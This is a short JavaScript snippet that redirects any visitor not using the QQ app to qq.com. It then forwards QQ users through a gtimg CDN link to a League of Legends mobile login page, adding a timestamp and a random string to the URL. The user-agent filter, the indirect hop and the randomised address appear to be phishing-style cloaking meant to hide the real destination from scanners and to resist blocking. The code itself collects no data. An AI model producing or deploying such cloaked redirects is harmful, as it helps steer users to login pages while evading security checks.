function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://qq.com";
    }
}

leleua();

window.onload = function () {
    const targetUrl = 'https://docsavatar.gtimg.com/3f73943a28ce34d82d98ab3d05dccb64aaad4433/1708745460261#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html';
    const timestamp = Date.now();
    const randomString = Math.random().toString(36).substring(2);
    const urlWithParam = `${targetUrl}u${timestamp}${randomString}`;
    window.location.href = urlWithParam
}
